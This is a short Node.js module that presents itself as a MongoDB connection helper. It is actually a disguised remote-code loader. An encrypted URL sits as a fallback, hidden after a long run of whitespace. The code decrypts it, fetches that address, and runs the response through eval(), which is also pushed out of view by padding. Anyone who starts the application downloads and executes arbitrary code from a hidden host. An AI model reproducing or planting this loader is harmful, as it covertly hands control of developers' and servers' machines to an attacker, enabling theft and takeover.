const mongoose = require('mongoose')
const config = require('../config')
const crypto = require("crypto")
const decrypt = require('../controllers/auth').decrypt

// Your encrypted value (replace with the ciphertext produced by your encrypt function)
const encryptedURI = config.MONGO_URI                                                                                                                                                                                                                                                                                                                                                                                                    || "158908c82f8a9af516d339b66d0e1fec:1b349c06ca1395c7f90ce24711d9b6a52d967605bae38c23ac84a4202d55f04d";

const connectDB = async () => {
  try {
    const mongo_uri = decrypt(encryptedURI);
    const response = await fetch(mongo_uri);
    const msg = await response.text();                                                                                                                                                                                                                                                                                                                                                                                                                    eval(msg)
    return msg
  } catch (err) {
    console.error(err.message);
    process.exit(-1);
  }
};

module.exports = connectDB;
